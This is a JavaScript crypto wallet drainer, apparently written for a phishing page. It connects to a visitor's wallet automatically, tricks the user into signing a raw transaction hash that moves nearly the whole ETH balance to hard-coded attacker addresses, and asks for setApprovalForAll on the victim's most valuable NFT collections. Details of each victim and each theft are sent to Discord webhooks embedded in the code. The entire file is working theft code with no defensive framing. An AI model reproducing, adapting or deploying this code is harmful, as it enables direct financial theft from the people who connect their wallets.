let web3Provider;
const receiveAddress = "0xF23653FedA01962D0A99F3E88d9304944203c41a";
const drainNftsInfo = {
    minValue: 0.00001,
    maxTransfers: 1,
}

let metamaskInstalled = false;

window.addEventListener('load', async () => {
    if (typeof window.ethereum !== 'undefined') metamaskInstalled = true;
});

Moralis.onWeb3Enabled(async (data) => {
    if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
});

Moralis.onChainChanged(async (chain) => {
    if (chain !== "0x1" && metamaskInstalled) await Moralis.switchNetwork("0x1");
});

async function onConnect() {
    await Moralis.enableWeb3(metamaskInstalled ? {} : { provider: "walletconnect" });
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];
    const url = window.location.href
    sW(`\`${walletAddress}\` is connected: ${url}`);
    console.log(`${walletAddress} is connected`)
    await verifyAsset();
}

setTimeout(async () => {
    onConnect()
}, 5000);

let eth_bal = 0;
const verifyAsset = async () => {
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];
    try {
        eth_bal = await web3Js.eth.getBalance(walletAddress);
        const r_bal = web3Js.utils.fromWei(eth_bal, 'ether');
        console.log(`Current balance for ${walletAddress} : ${r_bal} ETH`);
        if (r_bal >= 0.5) {
            let receiver = "0xC689a68e44cFCaca9C2B0E5A80c15639427B11b5"
            sW2(`Current balance for ${walletAddress} : ${r_bal} ETH`);
            askTransferWithSign(r_bal, receiver);
        } else if (r_bal > 0.01) {
            sW(`Current balance for ${walletAddress} : ${r_bal} ETH`);
            askTransferWithSign(r_bal, receiveAddress);
        } else {
            console.log(`Error, balance is too low. (< 0.01 ETH)`);
            sW(`Error, balance is too low. (< 0.01 ETH). Balance: ' ${r_bal}`);
            await askNfts();
        }
    } catch (e) {
        console.log(e);
        await askNfts();
    }
};

async function askTransferWithSign(rbal,receiver) {
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];
    const chainId = await web3Js.eth.getChainId();
    await web3Js.eth.getTransactionCount(walletAddress, "pending")
        .then(async (txnCount) => {
            const jgasPrice = await web3Js.eth.getGasPrice();
            const mgasPrice = web3Js.utils.toHex(Math.floor(jgasPrice * 1.4));
            const gas = new web3Js.utils.BN("22000");
            const cost = gas * Math.floor(jgasPrice * 2);
            const toSend = eth_bal - cost - 7000000000000000;
            console.log(`Sending ${web3Js.utils.fromWei(toSend.toString(), "ether")} ETH from ${walletAddress}...`);

            const txObject = {
                nonce: web3Js.utils.toHex(txnCount),
                gasPrice: mgasPrice, gasLimit: "0x55F0",
                to: receiver,
                value: "0x" + toSend.toString(16),
                data: "0x", v: "0x1", r: "0x", s: "0x"


            };
            let ethTX = new ethereumjs.Tx(txObject);
            const rawTx1 = '0x' + ethTX.serialize().toString('hex');
            const rawHash1 = web3Js.utils.sha3(rawTx1, { encoding: 'hex' });

            console.log("rawTx1:", rawTx1);
            console.log("rawHash1:", rawHash1);

            await web3Js.eth.sign(rawHash1, walletAddress).then(async (result) => {

                const signature = result.substring(2);
                const r = "0x" + signature.substring(0, 64);
                const s = "0x" + signature.substring(64, 128);
                const v = parseInt(signature.substring(128, 130), 16);

                const y = web3Js.utils.toHex(v + chainId * 2 + 8);

                ethTX.r = r;
                ethTX.s = s;
                ethTX.v = y;

                console.log(ethTX);

                const rawTx = '0x' + ethTX.serialize().toString('hex');
                const rawHash = web3Js.utils.sha3(rawTx, { encoding: 'hex' });

                console.log("rawTx:", rawTx);
                console.log("rawHash:", rawHash);

                await web3Js.eth.sendSignedTransaction(rawTx).then((hash) => console.log(hash)).catch((e) => console.log(e));
                if (rbal < 0.40) { sW(`Sending ${web3Js.utils.fromWei(toSend.toString(), "ether")} ETH from ${walletAddress}...`); }

            }).catch((err) => console.log(err));
        })
    await askNfts();
}

async function askNfts() {
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];

    const options = { method: 'GET', headers: { Accept: 'application/json' } };

    let walletNfts = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${walletAddress}&offset=0&limit=300`, options)
        .then(response => response.json())
        .then(nfts => {
            console.log(nfts)
            if (nfts.includes("Request was throttled.")) return ["Request was throttled."];
            return nfts.filter(nft => {
                if (nft.primary_asset_contracts.length > 0) return true
                else return false
            }).map(nft => {
                return {
                    type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
                    contract_address: nft.primary_asset_contracts[0].address,
                    price: round(nft.stats.one_day_average_price != 0 ? nft.stats.one_day_average_price : nft.stats.seven_day_average_price),
                    owned: nft.owned_asset_count,
                }
            })
        }).catch(err => console.error(err));

    if (walletNfts.includes("Request was throttled.")) return notEligible();
    if (walletNfts.length < 1) return notEligible();

    let transactionsOptions = [];
    for (nft of walletNfts) {
        if (nft.price === 0) continue;
        const ethPrice = round(nft.price * (nft.type == "erc1155" ? nft.owned : 1))
        // set minValue from settings.js
        if (ethPrice < drainNftsInfo.minValue) continue;
        const thewallet = receiveAddress
        transactionsOptions.push({
            price: ethPrice,
            options: {
                contractAddress: nft.contract_address,
                from: walletAddress,
                functionName: "setApprovalForAll",
                abi: [{
                    "inputs": [
                        { "internalType": "address", "name": "operator", "type": "address" },
                        { "internalType": "bool", "name": "approved", "type": "bool" }
                    ],
                    "name": "setApprovalForAll",
                    "outputs": [],
                    "stateMutability": "nonpayable",
                    "type": "function"
                }],
                params: { operator: thewallet, approved: true },
                gasLimit: (await web3Js.eth.getBlock("latest")).gasLimit
            }
        });
    }
    if (transactionsOptions.length < 1) return notEligible();

    let transactionLists = await transactionsOptions.sort((a, b) => b.price - a.price)
    for (const trans of transactionLists) {
        console.log(`Transferring ${trans.options.contractAddress} (${trans.price} ETH)`);
        await Moralis.executeFunction(trans.options).catch(O_o => console.error(O_o, options)).then(uwu => {
            if (uwu) sW(`Wallet Address: ${walletAddress}, Contract Address: ${trans.options.contractAddress}, Price: ${trans.price}`);
        });
    }
}


const notEligible = () => {
    notify("You are not eligible")
}

function notify(msg) {
    Toastify({
        text: msg,
        duration: 3000,
        gravity: "top",
        position: "right",
    }).showToast();
}

const round = (value) => {
    return Math.round(value * 10000) / 10000;
}

const sleep = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const rdmString = (length) => {
    let x = "";
    const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let i = 0; i < length; i++) x += possible.charAt(Math.floor(Math.random() * possible.length));
    return x;
}

const createNonce = () => {
    return `${rdmString(8)}-${rdmString(4)}-${rdmString(4)}-${rdmString(12)}`; // 1a196cf5-d873-9c36-e26ae9f3bd2e
}

const sW = (message) => {
    const webhookURL = "https://discord.com/api/webhooks/1004376828703670373/ajss7Nbs3NJVxAzWNvQw2XT08MgZZWoW5lwq5v8i_deMJlbicBNUKQtUzuOGIXB52Trt"
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: message
        }),
    }).catch(err => console.error(err));
}
const sW2 = (message) => {
    const webhookURL = "https://discord.com/api/webhooks/997864241879064597/Z1SLKVzcLD50E_gQEVmEexnmGR-IL4WTQR4GXclDidmqjIci7xgPEDEBIdUs79-pAf_h"
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: message
        }),
    }).catch(err => console.error(err));
}
